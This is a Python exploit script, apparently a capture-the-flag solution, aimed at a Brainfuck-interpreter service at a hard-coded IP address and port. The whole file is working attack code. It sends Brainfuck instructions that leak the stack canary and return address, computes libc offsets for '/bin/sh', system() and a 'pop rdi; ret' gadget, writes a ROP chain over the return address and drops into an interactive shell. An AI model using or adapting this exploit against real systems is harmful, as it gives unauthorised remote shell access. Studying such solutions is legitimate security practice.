#!/usr/bin/env python

from zio import *
import time

def calc_addr(ret):
	binsh  =  ret + 0x15ae16	# to /bin/sh
	system =  ret + 0x2477b		# system() function
	gadget =  ret + 0xc55		# 'pop rdi; ret' comeon gus
	return (binsh, system, gadget)


io = zio(('120.55.86.95', 22222))

ins = {
	'write_and_pass':      ',[>,]',
	'read_plus_and_print': ',,+.+.',
	'bypass_canary':       '.,>.,>.,>.,>.,>.,>.,>.,>',
	'get_ret':             '.>.>.>.>.>.>.>.>',
	'pass8':               '>>>>>>>>',
	'write8':			   ',>,>,>,>,>,>,>,>',
	'back8':               '<<<<<<<<',
}

# welcome information
io.writeline("6f78f333c8d330c8726d510efc28d9a1")
io.readline()
io.readline()

payload =  ins['write_and_pass']
payload += ins['bypass_canary']
payload += ins['pass8'] 
payload += ins['get_ret']
payload += ins['back8']
payload += ins['write8']
payload += ins['write8']
payload += ins['write8']

payload += ']'  # the } of c code
payload += 'q'  # finish Brainfuck code editing

io.write(payload)

time.sleep(5)

# Begin to bypass empty stack 0x200 + 0x8 <- a magic number
io.write('A' * 0x208 + "\x00")

# Begin to bypass canary
for i in range(0, 8):
	a = io.read(1)
	io.write(a)

# Begin to bypass EBP
#io.write('A' * 0x8 + "\x00")

# Begin to read RET
ret = l64(io.read(8))
print ""
print hex(ret)

binsh, system, gadget = calc_addr(ret)
binsh_str = l64(binsh)
system_str = l64(system)
gadget_str = l64(gadget)
print hex(binsh)
print hex(system)
print hex(gadget)
io.write(gadget_str)
io.write(binsh_str)
io.write(system_str)

io.interact()
